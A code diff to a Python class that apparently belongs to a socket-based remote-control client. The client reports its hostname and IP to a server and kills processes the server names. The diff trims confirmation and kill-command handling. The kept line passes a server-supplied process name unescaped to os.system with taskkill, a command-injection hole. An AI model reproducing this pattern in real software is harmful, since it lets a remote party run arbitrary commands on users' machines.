@@ -106,15 +106,6 @@ class Tasks:
             msg = self.client.soc.recv(1024).decode()
             self.client.soc.settimeout(None)
             self.logger.debug(f"Server: {msg}")
-
-        except (WindowsError, socket.error) as e:
-            self.logger.debug(f"Connection Error: {e}")
-            return False
-
-        try:
-            self.logger.debug(f"Sending confirmation...")
-            self.client.soc.send(f"{self.client.hostname} | {self.client.localIP}: Task List Sent.\n".encode())
-            self.logger.info(f"confirm completed.")
             return True
 
         except (WindowsError, socket.error) as e:
@@ -133,9 +124,6 @@ class Tasks:
         except (WindowsError, socket.error) as e:
             self.logger.debug(f"Connection Error: {e}")
             return False
-
-        if str(task2kill).lower()[:1] == 'q':
-            return True
 
         self.logger.debug(f"Killing {task2kill}...")
         os.system(f'taskkill /IM {task2kill} /F')
@@ -160,25 +148,10 @@ class Tasks:
         self.send_file_size()
         self.logger.debug(f"Calling send_file_content()...")
         self.send_file_content()
-        self.logger.debug(f"Calling Calling confirm()...")
+        self.logger.debug(f"Calling confirm()...")
         self.confirm()
         self.logger.debug(f"Removing {self.task_path}...")
         os.remove(self.task_path)
         self.logger.debug(f"Flushing stdout...")
         sys.stdout.flush()
-
-        try:
-            self.client.soc.settimeout(10)
-            self.logger.debug(f"Waiting for confirmation...")
-            kil = self.client.soc.recv(1024).decode()
-            self.client.soc.settimeout(None)
-            self.logger.debug(f"Server: {kil}")
-
-        except (WindowsError, socket.error) as e:
-            self.logger.debug(f"Connection Error: {e}")
-            return False
-
-        if str(kil)[:4].lower() == "kill":
-            self.logger.debug(f"Calling kill()...")
-            self.kill()
-            return True
+        return True
